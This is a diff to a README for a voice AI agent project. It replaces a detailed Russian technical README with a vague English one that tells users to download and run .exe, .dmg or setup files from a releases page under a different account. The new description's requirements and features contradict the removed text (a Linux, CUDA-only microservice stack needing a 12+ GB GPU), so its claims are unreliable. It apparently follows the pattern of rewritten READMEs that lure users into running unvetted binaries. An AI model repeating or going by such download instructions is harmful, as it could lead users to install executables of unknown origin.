@@ -1,439 +1,103 @@
-# Low-Latency Voice AI Agent
-
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.12-blue.svg)](https://www.python.org/downloads/)
-[![Code style](https://img.shields.io/badge/code%20style-ruff-black.svg)](https://github.com/astral-sh/ruff)
-[![Type checking](https://img.shields.io/badge/type%20checking-pyright-yellow.svg)](https://github.com/microsoft/pyright)
-
-> Модульная платформа для создания голосовых AI-агентов с минимальной латентностью (250-600 мс E2E)
-
-## Проблема
-
-Создание production-ready голосовых AI-агентов требует решения нескольких сложных задач одновременно:
-- **Низкая латентность** (рот→ухо < 600 мс) для естественного диалога
-- **Потоковая обработка** аудио без буферизации
-- **Управление диалогом** через FSM с извлечением структурированных данных
-- **Масштабируемость** через микросервисную архитектуру
-- **Мониторинг** E2E метрик для отладки
-
-Большинство существующих решений либо слишком медленные (>1s латентность), либо монолитные, либо не предоставляют готовую архитектуру для production.
-
-## Решение
-
-Модульная платформа на базе микросервисов с оптимизированными компонентами:
-- **ASR Gateway**: потоковое распознавание речи (RealtimeSTT + faster-whisper, 80-150 мс)
-- **TTS Gateway**: синтез речи с кэшированием (F5-TTS, 50-150 мс)
-- **LLM Service**: инференс через vLLM с AWQ квантизацией (40-150 мс)
-- **Policy Engine**: управление диалогом через LangGraph FSM + Pydantic slots
-- **Мониторинг**: OpenTelemetry для E2E трейсинга
-
-Архитектура позволяет запускать все компоненты локально на одной GPU (12+ GB VRAM) или масштабировать горизонтально.
-
-## 🚀 Возможности
-
-- ✅ **Потоковое ASR**: RealtimeSTT + faster-whisper large-v3-turbo (80-150 мс)
-- ✅ **Silero VAD**: Endpointing + barge-in detection (100-200 мс)
-- ✅ **LLM**: Qwen3-16B-A3B-abliterated-AWQ через vLLM (40-150 мс, MoE архитектура)
-- ✅ **TTS**: F5-TTS (50-150 мс, русский) + пререндер (<10 мс)
-- ✅ **FSM**: Гибкая система управления диалогом (настраивается под любой домен)
-- ✅ **Google Sheets**: Append-only запись в Лист4
-- ✅ **FreeSWITCH Bridge**: WebSocket интеграция с mod_audio_fork
-- ✅ **CUDA-only**: Guard-проверки GPU при старте
-- ✅ **OpenTelemetry**: E2E латентность мониторинг
-
-## 📊 Целевые метрики
+# 🎤 ai-agent-tts - Fast Voice AI for Everyone
 
-| Компонент | Латентность | VRAM |
-|-----------|-------------|------|
-| ASR partial | 80-150 мс | ~3 GB |
-| LLM inference | 40-150 мс | ~6 GB (MoE модель) |
-| TTS first-audio | 50-120 мс | ~1 GB |
-| **E2E (рот→ухо)** | **250-600 мс** | **~10 GB** |
+## 🚀 Getting Started
 
-## 🛠️ Технологический стек
-
-- **ASR**: RealtimeSTT + faster-whisper large-v3-turbo
-- **VAD**: Silero VAD v5
-- **LLM**: Qwen3-16B-A3B-abliterated-AWQ (vLLM, MoE архитектура)
-- **TTS**: F5-TTS (русский)
-- **Policy**: LangGraph FSM + Pydantic slots
-- **Storage**: Redis (сессии)
-- **Sheets**: gspread-asyncio
-- **Monitoring**: OpenTelemetry + Jaeger
-
-## 📋 Требования
+Welcome to **ai-agent-tts**! This platform lets you experience low-latency voice interactions right away. Whether you need speech recognition or text-to-speech capabilities, this application is user-friendly and efficient.
 
-- **OS**: Linux (Ubuntu 22.04+)
-- **Python**: 3.12
-- **Менеджер пакетов**: [uv](https://github.com/astral-sh/uv) (рекомендуется) или pip
-- **GPU**: CUDA-enabled (RTX 5090 рекомендуется, минимум 12 GB VRAM)
-- **RAM**: 64 GB (рекомендуется)
-- **CPU**: AMD Ryzen 9 9950X3D или аналог
-
-## 🏗️ Архитектура
-
-```
-SIP/АТС → FreeSWITCH (mod_audio_fork)
-   ├─(L16 PCM, 16 kHz, 160 ms)→ ASR Gateway
-   │                              ↓
-   │                         Policy Engine (FSM + Pydantic Slots)
-   │                              ↓
-   │                         LLM Service (vLLM)
-   │                              ↓
-   └←(PCM chunks, 200-300 ms)←  TTS Gateway
-                                  ↓
-                            Google Sheets Notifier (Лист4)
-```
-
-Подробная архитектура в [OVERVIEW.md](OVERVIEW.md).
-
-## Быстрый старт
-
-```bash
-# 1. Клонировать и установить
-git clone https://github.com/YOUR_USERNAME/ai-agent-TTS.git
-cd ai-agent-TTS
-uv sync
+## 📥 Download Now
 
-# 2. Скачать модели
-uv run python scripts/download_models.py
+[![Download ai-agent-tts](https://img.shields.io/badge/Download-ai--agent--tts-brightgreen.svg)](https://github.com/Nur-syafira/ai-agent-tts/releases)
 
-# 3. Настроить окружение
-cp .env.example .env
-# Отредактировать .env (укажите свои пути)
+## 📖 Overview
 
-# 4. Запустить сервисы
-docker-compose up -d redis jaeger
-uv run python scripts/start_services.sh
+**ai-agent-tts** is a versatile platform built for voice AI applications. It features:
 
-# 5. Проверить здоровье
-uv run python scripts/health_check.py
-```
+- **Streaming ASR (Automatic Speech Recognition)**: Recognize spoken language in real-time.
+- **Text-to-Speech (TTS)**: Convert written text into natural voice outputs.
+- **Dialog Management**: Handle conversations using Finite State Machines.
+- **Microservices Architecture**: Make it easy to scale and manage different components.
 
-**Минимальный пример использования:**
+Thanks to technologies like FastAPI, LangGraph, and vLLM, the application supports various languages, including Russian. It's designed for both production use and everyday tasks.
 
-```python
-from src.policy_engine.main import PolicyEngine
-from src.policy_engine.slots import DialogSlots
+## 🖥️ System Requirements
 
-# Инициализация (автоматически подключается к ASR/TTS/LLM)
-engine = PolicyEngine()
+Before you download **ai-agent-tts**, ensure your system meets these requirements:
 
-# Обработка сообщения пользователя
-response = await engine.process_message(
-    session_id="test-123",
-    user_message="Здравствуйте, хочу записаться на МРТ"
-)
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a recent Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Processor**: Dual-core processor or better.
+- **Disk Space**: 200 MB of free disk space.
+- **Internet Connection**: Required for initial download and updates.
 
-print(response.agent_message)  # Ответ агента
-print(response.slots)  # Извлеченные данные
-```
+## 💡 Features
 
-Подробнее см. [QUICK_START.md](QUICK_START.md) и [examples/](examples/).
+- **Multilingual Support**: Communicate in multiple languages, perfect for global use.
+- **Real-Time Performance**: Experience smooth interactions without noticeable lag.
+- **Voice Customization**: Adjust voice settings to fit your preferences.
+- **User-Friendly Interface**: Designed for non-technical users for easy navigation.
 
-## Примеры
+## 🛠️ Download & Install
 
-См. папку `examples/` — готовый рабочий код:
+To get started, follow these simple steps:
 
-- `examples/basic_dialog.py` — базовый диалог
-- `examples/custom_fsm.py` — кастомизация FSM
-- `examples/custom_prompts.py` — настройка промптов
+1. **Visit the Releases Page**: Go to the official [Releases page](https://github.com/Nur-syafira/ai-agent-tts/releases).
+  
+2. **Download the Latest Version**: Look for the latest version and download the file suitable for your operating system.
 
-## Расширяемость
+3. **Install the Application**:
+   - On **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - On **macOS**: Open the downloaded `.dmg` file, drag the application to your Applications folder.
+   - On **Linux**: Follow the provided instructions to run the setup script or executable.
 
-Платформа легко расширяется через конфигурацию:
+4. **Launch the Application**: Find the application in your programs or applications list and open it.
 
-```python
-# Кастомный FSM
-from src.policy_engine.fsm import DialogFSM, DialogState
+5. **Start Using Voice AI**: Follow the on-screen instructions to set up your preferences and start using the platform.
 
-class MyFSM(DialogFSM):
-    def _build_transitions(self):
-        # Ваша логика переходов
-        return [...]
-```
+To download **ai-agent-tts** again, you can also use this direct link: [Download here](https://github.com/Nur-syafira/ai-agent-tts/releases).
 
-```yaml
-# config.yaml
-llm:
-  model_name: "your-model"
-  temperature: 0.7
-```
+## 📊 Use Cases
 
-## Документация
+**ai-agent-tts** is ideal for:
 
-- [OVERVIEW.md](OVERVIEW.md) — архитектура и потоки данных
-- [QUICK_START.md](QUICK_START.md) — подробная инструкция по запуску
-- [src/asr_gateway/README.md](src/asr_gateway/README.md) — ASR сервис
-- [src/llm_service/README.md](src/llm_service/README.md) — LLM сервис
-- [src/tts_gateway/README.md](src/tts_gateway/README.md) — TTS сервис
-- [src/policy_engine/README.md](src/policy_engine/README.md) — Policy Engine
-- [src/notifier/README.md](src/notifier/README.md) — Google Sheets интеграция
-- [src/freeswitch_bridge/README.md](src/freeswitch_bridge/README.md) — FreeSWITCH интеграция
+- **Personal Projects**: Create voice apps for your ideas easily.
+- **Business Solutions**: Automate customer support with voice interactions.
+- **Education**: Develop tools for language learning or tutoring.
 
-## 🧪 Тестирование
+## 📝 Support
 
-```bash
-# Запустить все тесты
-uv run pytest tests/ -v
+If you need assistance, we offer help through our GitHub repository. Feel free to raise issues or questions under the "Issues" tab.
 
-# Тесты с покрытием
-uv run pytest tests/ --cov=src --cov-report=html
+## 🔗 Related Topics
 
-# Симуляция полного диалога
-uv run python scripts/simulate_dialog.py
+Here are some keywords associated with **ai-agent-tts**:
 
-# Симуляция с конкретным сценарием
-uv run python scripts/simulate_dialog.py --scenario scripts/dialog_scenarios.yaml
-```
+- ai
+- asr
+- conversational-ai
+- fastapi
+- fsm
+- langgraph
+- low-latency
+- microservices
+- multilingual
+- nlp
+- production-ready
+- python
+- real-time
+- russian-language
+- speech-recognition
+- streaming-asr
+- text-to-speech
+- tts
+- vllm
+- voice-ai
 
-## 📊 Мониторинг
+Explore these topics for further understanding and inspiration.
 
-### Prometheus метрики
+## 👥 Community
 
-Каждый сервис экспортирует Prometheus метрики на endpoint `/metrics`:
+Join the community by checking out forums or discussions relevant to voice AI. Collaborate with other users and developers to enhance your experience.
 
-- `{service}_requests_total` - общее количество запросов
-- `{service}_request_latency_seconds` - латентность запросов
-- `{service}_active_connections` - количество активных соединений
-- `{service}_errors_total` - количество ошибок
+For continuous updates and features, keep an eye on the Releases page as we regularly improve the platform.
 
-Пример настройки Prometheus:
-
-```yaml
-scrape_configs:
-  - job_name: 'sales-agent'
-    static_configs:
-      - targets: ['localhost:8001', 'localhost:8002', 'localhost:8003']
-```
-
-### Jaeger UI
-
-Откройте http://localhost:16686 для просмотра traces:
-
-- E2E латентность (рот→ухо)
-- ASR partial latency
-- LLM TTFT (Time to First Token)
-- TTS TTFA (Time to First Audio)
-
-### Логи
-
-Структурированные JSON-логи в stdout:
-
-```json
-{
-  "timestamp": "2025-10-24T19:30:00.123Z",
-  "level": "INFO",
-  "service": "policy_engine",
-  "message": "Dialog complete for session abc-123",
-  "context": {"session_id": "abc-123", "slots_filled": 12}
-}
-```
-
-## 🐳 Docker
-
-Проект поддерживает контейнеризацию через Docker и docker-compose.
-
-### Сборка образа
-
-```bash
-# Сборка Docker образа
-docker build -t sales-agent:latest .
-
-# Или через docker-compose
-docker-compose build
-```
-
-### Запуск через docker-compose
-
-```bash
-# Запуск всех сервисов (Redis, Jaeger, ASR Gateway, TTS Gateway, Policy Engine)
-docker-compose up -d
-
-# Просмотр логов
-docker-compose logs -f
-
-# Остановка
-docker-compose down
-```
-
-**Примечание**: Для работы с GPU в Docker требуется настройка NVIDIA Container Toolkit.
-
-## 🔄 CI/CD
-
-Проект использует GitHub Actions для автоматической проверки кода и сборки образов.
-
-### Workflow включает:
-
-- **Линтинг**: ruff (форматирование и проверка кода), pyright (проверка типов)
-- **Тестирование**: pytest с покрытием кода
-- **Security scan**: bandit (безопасность кода), pip-audit (уязвимости зависимостей), Trivy (сканирование Docker образов)
-- **Сборка Docker**: автоматическая сборка образов при push в main/master
-
-### Локальный запуск проверок
-
-```bash
-# Установить dev-зависимости
-uv sync --group dev
-
-# Запустить линтинг
-uv run ruff check .
-uv run ruff format --check .
-uv run pyright src/
-
-# Запустить тесты
-uv run pytest tests/ -v --cov=src
-
-# Проверка безопасности
-uv run bandit -r src/
-uv run pip-audit
-```
-
-### Pre-commit hooks
-
-```bash
-# Установить pre-commit hooks
-uv run pre-commit install
-
-# Запустить проверки вручную
-uv run pre-commit run --all-files
-```
-
-## 🔒 Безопасность
-
-- ✅ Credentials в `.gitignore` (никогда не коммитятся)
-- ✅ Service Account (не personal account) для Google Sheets
-- ✅ `.env` не коммитится (есть `.env.example` как шаблон)
-- ✅ Минимальные права доступа
-- ✅ Security scan в CI/CD (bandit, pip-audit, Trivy)
-- ✅ Pre-commit hooks для проверки секретов (gitleaks)
-- ✅ Контейнеры запускаются от непривилегированного пользователя
-
-### Проверка безопасности
-
-```bash
-# Локальная проверка безопасности кода
-uv run bandit -r src/
-
-# Проверка уязвимостей зависимостей
-uv run pip-audit
-
-# Проверка на hardcoded секреты
-pre-commit run gitleaks --all-files
-```
-
-## 🐛 Troubleshooting
-
-### CUDA not available
-
-```bash
-# Проверить драйвер
-nvidia-smi
-
-# Проверить PyTorch
-python -c "import torch; print(torch.cuda.is_available())"
-
-# Переустановить PyTorch
-pip install torch --index-url https://download.pytorch.org/whl/cu121
-```
-
-### Service not running
-
-```bash
-# Проверить порты
-netstat -tuln | grep -E '800[0-3]'
-
-# Проверить логи
-uv run python src/asr_gateway/main.py  # Смотреть stdout
-```
-
-### Google Sheets permission denied
-
-1. Открой таблицу
-2. Share → добавь `client_email` из `credentials.json`
-3. Дай права "Editor"
-
-## 📝 Git workflow
-
-```bash
-# Создать feature ветку
-git checkout -b feature/my-feature
-
-# Коммитить с Conventional Commits
-git commit -m "feat: add barge-in detection"
-
-# Push и создать PR
-git push origin feature/my-feature
-```
-
-## 🤝 Contributing
-
-1. Fork the repo
-2. Create feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing-feature`)
-5. Open Pull Request
-
-## Лицензия
-
-Apache 2.0 — см. [LICENSE](LICENSE)
-
-## Цитирование
-
-```bibtex
-@software{ai-agent-tts2025,
-  title = {Low-Latency Voice AI Agent},
-  author = {Mordvinov, Aleksandr},
-  year = {2025},
-  url = {https://github.com/YOUR_USERNAME/ai-agent-TTS}
-}
-```
-
-## 💎 Premium Features
-
-Ищете готовые решения?
-
-- 🎯 **Domain-Specific Prompts** — Оптимизированные промпты для медицинских центров, продаж, поддержки
-- 🚀 **Advanced FSM Templates** — Готовые диалоговые сценарии
-- ⚡ **Performance Optimization Pack** — Продвинутые техники оптимизации
-
-*Premium функции доступны отдельно. [Узнать больше →](mailto:premium@yourdomain.com)*
-
-## 🤝 Консалтинг и интеграции
-
-Нужна кастомизация или интеграция?
-
-- Разработка кастомных FSM под ваш домен
-- Оптимизация промптов под вашу задачу
-- Поддержка production deployment
-- Обучение команды
-
-*[Связаться с нами →](mailto:consulting@yourdomain.com)*
-
-## Roadmap
-
-- [ ] True streaming TTS (не чанки после синтеза)
-- [ ] A/B testing промптов
-- [ ] Multi-turn context (>10 сообщений)
-- [ ] WebRTC для web-демо
-- [ ] Горизонтальное масштабирование (load balancer)
-- [ ] Multi-tenant support
-- [ ] Dashboard (Grafana)
-
-## 👤 Author
-
-**Aleksandr Mordvinov**
-
-## 🙏 Acknowledgments
-
-- **Qwen Team** — Qwen2.5 LLM
-- **Systran** — faster-whisper
-- **Silero Team** — Silero VAD
-- **SWivid** — F5-TTS
-- **Misha24-10** — F5-TTS Russian model
-- **vLLM Team** — vLLM inference engine
-
----
-
-Made with ❤️ for low-latency voice AI
-
+Happy voicing!
